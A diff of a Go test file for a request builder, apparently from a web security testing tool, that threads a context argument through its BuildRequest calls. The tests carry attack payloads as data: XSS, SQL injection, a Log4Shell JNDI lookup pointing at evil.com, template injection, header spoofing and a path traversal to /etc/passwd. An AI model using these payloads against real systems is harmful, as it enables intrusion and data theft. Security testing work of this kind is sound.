@@ -2,6 +2,7 @@ package realistic
 
 import (
 	"bytes"
+	"context"
 	"strings"
 	"testing"
 )
@@ -20,7 +21,7 @@ func TestBuilderBuildRequest_Query(t *testing.T) {
 		},
 	}
 
-	req, err := builder.BuildRequest("<script>alert(1)</script>", template)
+	req, err := builder.BuildRequest(context.Background(), "<script>alert(1)</script>", template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -64,7 +65,7 @@ func TestBuilderBuildRequest_FormBody(t *testing.T) {
 		},
 	}
 
-	req, err := builder.BuildRequest("' OR 1=1 --", template)
+	req, err := builder.BuildRequest(context.Background(), "' OR 1=1 --", template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -110,7 +111,7 @@ func TestBuilderBuildRequest_JSON(t *testing.T) {
 		},
 	}
 
-	req, err := builder.BuildRequest("${jndi:ldap://evil.com/x}", template)
+	req, err := builder.BuildRequest(context.Background(), "${jndi:ldap://evil.com/x}", template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -148,7 +149,7 @@ func TestBuilderBuildRequest_Cookie(t *testing.T) {
 		},
 	}
 
-	req, err := builder.BuildRequest("admin' OR '1'='1", template)
+	req, err := builder.BuildRequest(context.Background(), "admin' OR '1'='1", template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -189,7 +190,7 @@ func TestBuilderBuildRequest_Header(t *testing.T) {
 	}
 
 	payload := "{{constructor.constructor('return this')()}}"
-	req, err := builder.BuildRequest(payload, template)
+	req, err := builder.BuildRequest(context.Background(), payload, template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -211,7 +212,7 @@ func TestBuilderBuildRequest_XForwarded(t *testing.T) {
 	}
 
 	payload := "127.0.0.1, 192.168.1.1"
-	req, err := builder.BuildRequest(payload, template)
+	req, err := builder.BuildRequest(context.Background(), payload, template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -239,7 +240,7 @@ func TestBuilderBuildRequest_Path(t *testing.T) {
 	}
 
 	payload := "../../../etc/passwd"
-	req, err := builder.BuildRequest(payload, template)
+	req, err := builder.BuildRequest(context.Background(), payload, template)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -254,7 +255,7 @@ func TestBuilderRealisticHeaders(t *testing.T) {
 	builder := NewBuilder("https://example.com")
 	builder.RandomizeUA = true
 
-	req, err := builder.BuildRequest("test", nil)
+	req, err := builder.BuildRequest(context.Background(), "test", nil)
 	if err != nil {
 		t.Fatalf("BuildRequest failed: %v", err)
 	}
@@ -313,7 +314,7 @@ func TestDefaultTemplates(t *testing.T) {
 
 	for _, tt := range tests {
 		t.Run(tt.name, func(t *testing.T) {
-			req, err := builder.BuildRequest("test_payload", tt.template)
+			req, err := builder.BuildRequest(context.Background(), "test_payload", tt.template)
 			if err != nil {
 				t.Fatalf("BuildRequest failed: %v", err)
 			}
@@ -332,7 +333,7 @@ func TestRandomUserAgent(t *testing.T) {
 	// Generate multiple requests and check UAs vary
 	uas := make(map[string]bool)
 	for i := 0; i < 20; i++ {
-		req, _ := builder.BuildRequest("test", nil)
+		req, _ := builder.BuildRequest(context.Background(), "test", nil)
 		uas[req.Header.Get("User-Agent")] = true
 	}
 
@@ -368,7 +369,7 @@ func TestLocationConstants(t *testing.T) {
 func TestCloneRequest(t *testing.T) {
 	builder := NewBuilder("https://example.com")
 
-	original, _ := builder.BuildRequest("test", &RequestTemplate{
+	original, _ := builder.BuildRequest(context.Background(), "test", &RequestTemplate{
 		Method: "POST",
 		Path:   "/api",
 		FormData: map[string]string{
